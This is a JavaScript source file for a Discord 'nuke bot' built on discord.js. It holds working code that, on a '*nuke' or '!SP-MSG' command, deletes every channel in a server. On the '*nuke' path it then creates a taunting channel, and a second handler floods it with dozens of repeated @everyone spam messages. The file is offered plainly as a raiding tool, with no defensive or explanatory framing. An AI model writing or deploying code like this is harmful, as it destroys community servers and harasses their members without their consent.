const {
    memberNicknameMention
} = require('@discordjs/builders');
const Discord = require('discord.js');
const client = new Discord.Client({
    intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MESSAGES]
});
const {
    MessageEmbed
} = require('discord.js');


client.on('ready', () => {
    console.log('nuke bot is ready')
});


client.on('message', async (message) => {
  if (message.content === '*nuke') {
  message.guild.channels.cache.forEach
        (channel => channel.delete());
 
        await message.guild.channels.create
        ('Achiee runs you', {
            type : 'text'
        }).then(async channel=> {
        channel.send('@everyone nuked by Fixnz ! :flushed:')
        })
    }
})


client.on('message', async (message) => {
    if (message.content === '@everyone nuked by NAME_HERE ! :flushed:') {
        await message.guild.channels.create
        ('Fixnz runs you', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by NAME_HERE ! :flushed:')
        message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')
        message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')
        message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')
        message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')
        message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')
        message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')
        message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')
        message.channel.send('@everyone nuked by NAME HERE ! :flushed:')


message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')
          message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

          message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')

message.channel.send('@everyone nuked by NAME_HERE ! :flushed:')
   })
}             
})


client.login("YOUR_BOT_TOKEN");


const prefix = '!'; // Define the prefix

client.on('message', async (message) => {
  if (message.content.startsWith(prefix + 'SP-MSG')) { // Check for the prefix before the command
    message.guild.channels.cache.forEach(channel => channel.delete());
    // Rest of the code remains the same
  }
});
